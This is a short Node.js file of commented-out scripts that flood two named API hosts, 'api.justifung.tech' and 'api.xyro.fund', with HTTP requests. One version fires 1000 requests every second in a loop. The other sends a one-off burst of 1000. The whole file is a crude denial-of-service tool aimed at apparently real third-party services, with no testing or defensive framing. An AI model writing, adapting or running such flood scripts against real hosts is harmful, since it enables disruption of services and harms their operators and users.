// // const http = require('http');

// // const targetUrl = 'https://api.justifung.tech';
// // const requestsPerSecond = 1000;

// // setInterval(() => {
// //   for (let i = 0; i < requestsPerSecond; i++) {
// //     http.get(targetUrl, (res) => {
// //       console.log('Request sent');
// //     }).on('error', (err) => {
// //       console.error('Error:', err.message);
// //     });
// //   }
// // }, 1000);

// const https = require('https');

// const target = 'https://api.xyro.fund/';
// const requests = 1000; // Number of requests to send

// for (let i = 0; i < requests; i++) {
//   https.get(target, (res) => {
//     console.log(`Request ${i+1} sent!`);
//   }).on('error', (err) => {
//     console.error(`Error: ${err.message}`);
//   });
// }